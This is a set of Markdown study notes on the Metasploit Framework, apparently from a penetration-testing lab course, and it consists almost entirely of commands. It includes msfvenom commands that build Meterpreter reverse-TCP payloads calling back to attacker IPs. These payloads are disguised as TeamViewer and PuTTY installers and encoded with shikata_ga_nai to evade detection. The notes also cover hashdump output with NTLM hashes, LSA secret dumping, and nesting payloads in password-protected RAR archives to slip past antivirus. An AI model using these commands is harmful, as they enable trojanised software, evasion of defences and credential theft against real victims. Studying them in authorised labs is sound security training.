---
title: "The Metasploit Framework"
weight: 37
---

permanent host set

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
```

&nbsp;

```shell-session
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
msf6 auxiliary(scanner/ssh/ssh_login) > search type:payload platform:windows arch:x64 reverse_tcp
```

&nbsp;

#### MSF - Show Targets

Targets

```shell-session
msf6 > show targets

[-] No exploit module selected.
```

&nbsp;

&nbsp;

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7


msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6

target => 6
```

&nbsp;

&nbsp;

For example, `windows/shell_bind_tcp` is a single payload with no stage, whereas `windows/shell/bind_tcp` consists of a stager (`bind_tcp`) and a stage (`shell`).

&nbsp;

&nbsp;

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   
   
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads

[*] 3
```

&nbsp;

shikata gai nai encoding

```shell-session
cube111@local[/local]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```

```shell-session
cube111@local[/local]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

&nbsp;

&nbsp;

# Databases

&nbsp;

```shell-session
cube111@local[/local]$ sudo msfdb init
```

&nbsp;

```shell-session
cube111@local[/local]$ sudo msfdb run
```

&nbsp;

Databases

```shell-session
msf6 > workspace -a Target_1

[*] Added workspace: Target_1
[*] Workspace: Target_1


msf6 > workspace Target_1 

[*] Workspace: Target_1


msf6 > workspace

  default
* Target_1
```

&nbsp;

&nbsp;

```shell-session
msf6 > db_import Target.xml
```

&nbsp;

```shell-session
msf6 > hosts
```

```shell-session
msf6 > services
```

&nbsp;

&nbsp;

#### MSF - DB Export

Databases

```shell-session
msf6 > db_export -h
```

&nbsp;

#### MSF - Stored Credentials

Databases

```shell-session
msf6 > creds -h
```

&nbsp;

## Loot

The `loot` command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.

#### MSF - Stored Loot

Databases

```shell-session
msf6 > loot -h
```

&nbsp;

&nbsp;

#### Downloading MSF Plugins

Plugins

```shell-session
cube111@local[/local]$ git clone https://github.com/darkoperator/Metasploit-Plugins
cube111@local[/local]$ ls Metasploit-Plugins

aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb
alias.rb           komand.rb      pentest.rb           thread.rb
auto_add_route.rb  lab.rb         request.rb           token_adduser.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb
db_credcollect.rb  msfd.rb        sample.rb            twitt.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
growl.rb           openvas.rb     sounds.rb
```

&nbsp;

```shell-session
cube111@local[/local]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

&nbsp;

#### MSF - Searching for Exploit

Meterpreter

```shell-session
msf6 > search iis_webdav_upload_asp
```

&nbsp;

```shell-session
msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester
```

&nbsp;

&nbsp;

```shell-session
meterpreter > getuid
```

&nbsp;

#### MSF - Dumping Hashes

Meterpreter

```shell-session
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::


meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
Local SID : S-1-5-21-1709780765-3897210020-3926566182

SAMKey : 37ceb48682ea1b0197c7ab294ec405fe

RID  : 000001f4 (500)
```

&nbsp;

```shell-session
meterpreter > lsa_dump_sam
```

&nbsp;

```shell-session
meterpreter > lsa_dump_secrets
```

&nbsp;

&nbsp;

Custom mudule

```shell-session
[!bash!]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
[!bash!]$ msfconsole -m /usr/share/metasploit-framework/modules/
```

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ msfconsole -q 

msf6 > use multi/handler
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):
```

&nbsp;

&nbsp;

#### MSF - Searching for Local Exploit Suggester

Introduction to MSFVenom

```shell-session
msf6 > search local exploit suggester

<...SNIP...>
   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session
   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester
   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure

<SNIP>
```

&nbsp;

&nbsp;

IDS/IPS Evasion

```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

```plaintext
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lport=4444 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
```

&nbsp;

Archive 

&nbsp;

```shell-session
[!bash!]$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
[!bash!]$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
```

&nbsp;

```shell-session
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

&nbsp;

```shell-session
[!bash!]$ rar a ~/test.rar -p ~/test.js
```

#### Removing the .RAR Extension

```shell-session
[!bash!]$ mv test.rar test
[!bash!]$ ls
```

&nbsp;

#### Archiving the Payload Again

```shell-session
[!bash!]$ rar a test2.rar -p test

Enter password (will not be echoed): ******
Reenter password: ******
```

&nbsp;

#### Removing the .RAR Extension

```shell-session
[!bash!]$ mv test2.rar test2
[!bash!]$ ls

test   test2   test.js
```

The test2 file is the final .rar archive with the extension (.rar) deleted from the name. After that, we can proceed to upload it on VirusTotal for another check.

#### VirusTotal

```shell-session
[!bash!]$ msf-virustotal -k <API key> -f test2
```